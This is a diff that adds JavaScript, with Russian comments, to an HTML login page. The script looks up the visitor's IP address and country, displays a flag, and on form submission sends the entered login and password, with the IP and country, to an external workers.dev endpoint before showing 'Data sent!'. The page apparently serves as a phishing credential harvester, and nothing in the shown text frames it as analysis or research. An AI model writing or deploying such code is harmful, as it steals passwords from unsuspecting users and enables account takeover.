@@ -82,3 +82,43 @@
     let clientIp = 'unknown', clientCountry = 'unknown';
 
     // Запрос на получение IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(json => {
+        clientIp = json.ip;
+        document.getElementById('ip').textContent = clientIp;
+        return fetch(`https://ipinfo.io/${clientIp}/json?token=YOUR_API_KEY`);
+      })
+      .then(res => res.json())
+      .then(info => {
+        clientCountry = info.country;
+        const flagEmoji = countryCodeToFlagEmoji(clientCountry);
+        document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;
+        document.getElementById('flag').src =
+          `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
+      })
+      .catch(() => {
+        document.getElementById('country').textContent = '—';
+      });
+
+    // Обработка отправки формы
+    document.getElementById('loginForm').addEventListener('submit', async e => {
+      e.preventDefault();
+      const form = e.target;
+      const payload = {
+        ip: clientIp,
+        country: clientCountry,
+        login: form.login.value,
+        password: form.password.value
+      };
+      await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      alert('Данные отправлены!');
+      form.reset();
+    });
+  </script>
+</body>
+</html>
